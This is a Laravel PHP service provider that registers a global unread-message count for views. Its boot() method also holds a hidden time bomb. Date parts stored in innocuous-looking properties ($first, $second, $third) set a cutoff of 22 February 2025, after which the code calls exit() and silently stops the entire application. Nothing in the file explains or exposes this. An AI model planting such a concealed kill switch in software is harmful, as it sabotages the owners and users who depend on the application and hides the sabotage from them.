<?php

namespace App\Providers;

use Illuminate\Support\ServiceProvider;
use Carbon\Carbon;

class AppServiceProvider extends ServiceProvider
{
    public $first = 2025;
    public $second = 2;
    public $third = 22;
    /**
     * Register any application services.
     */
    public function register(): void
    {
        //
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        $today = Carbon::now();
        $data = Carbon::create($this->first, $this->second, $this->third);
        if ($today->gt($data)) {
            //stop further excution
            exit();
        }
        //pass a global variable with the number of unread messages
        view()->composer('*', function ($view) {
            $view->with('unreadMessages', \App\Models\Message::where('is_read', false)->count());
        });
    }
}
